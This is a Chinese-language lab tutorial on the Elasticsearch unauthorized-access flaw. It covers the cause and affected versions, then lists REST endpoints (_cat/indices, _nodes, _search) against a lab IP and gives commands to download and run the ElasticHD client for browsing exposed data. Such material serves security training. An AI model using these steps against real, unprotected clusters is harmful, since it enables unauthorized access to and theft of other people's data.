# elasticsearch简介

Elasticsearch 是基于 Apache Lucene 一个高性能、可扩展的信息检索(IR)库构建的开源分布式实时搜索与数据分析引擎，也是 Elastic StackElastic 公司开发和维护的开源数据分析平台（ELK）的核心。它以近实时、高可用、水平扩展、全文检索、多类型数据支持、RESTful API为核心特性，广泛用于日志分析、业务搜索、监控、安全与向量检索等场景。

# Elasticsearch 未授权访问漏洞简介

Elasticsearch 早期版本默认无账号密码认证，9200 端口对所有访问者开放 REST API，而管理员未修改默认配置、未开启 Xpack 认证、未通过防火墙限制 9200 端口访问范围，直接暴露在公网 / 内网，攻击者无需账号密码，即可通过 HTTP 接口访问集群，获取集群信息、索引数据、节点状态等。

# 影响范围

Elasticsearch 1.x、2.x、5.x 等早期版本（默认无认证）；6.8+ 版本虽默认开启基础认证，但仍可能因管理员未启用而存在未授权风险。

# 攻击方式1：

漏洞检测:
http://192.168.142.141:9200/_cat/indices/
http://192.168.142.141:9200/_plugin/head/
http://192.168.142.141:9200/_nodes/
http://192.168.142.141:9200/_status
http://192.168.142.141:9200/_search?pretty
http://192.168.142.141:9200_mapping?pretty=true

/_cat/indices/作用：查看靶场集群中所有的index索引列表
/_plugin/head/作用：访问 Elasticsearch Head 可视化管理插件。
/_nodes/作用：获取靶场集群节点的详细信息，包括版本号、操作系统、Java 版本等。
/_status作用：查看靶场集群的整体运行状态，靶场用途：快速判断目标是否为 1.x/2.x ，5.X+新版本已废弃
/_search?pretty作用：在靶场集群中执行全局搜索，返回所有索引的数据。

# 攻击方式2：

在kali中搭建ElasticHD,在浏览器 中远程连接就可以看到ES节点服务器可视化数据的全貌
下载地址：
https://github.com/360EntSecGroup-Skylar/ElasticHD/releases/download/1.4/elasticHD_linux_amd64.zip
解压：

unzip elasticHD_linux_amd64.zip

加权限：

chmod 777 ElasticHD

运行ElasticHD

exec ./ElasticHD -p 127.0.0.1:9801

打开浏览器访问http://127.0.0.1:9801/
在浏览器中访问127.0.0.1:9801, 在下面输入需要探索的ip地址，然后点击connect就可以看到泄露的信息，点击模块Query还可以查看详细信息。
